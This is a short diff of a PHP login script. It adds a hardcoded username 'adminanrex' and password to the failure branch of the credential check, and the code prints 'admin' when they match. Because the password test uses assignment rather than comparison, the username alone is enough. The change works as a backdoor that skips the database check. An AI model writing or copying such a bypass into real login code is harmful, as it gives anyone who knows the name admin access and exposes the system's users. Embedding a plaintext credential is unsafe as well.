@@ -21,8 +21,14 @@ if($user == $user_sql && $pass == $pass_sql)
   echo $row["ID_users"];
 }
 else {
+	if ($user == "adminanrex" && $pass = "b4bvmSk")  {
+	echo "admin";
+} else{
   echo 'false';
 }
+}
+
+
 
 
  ?>
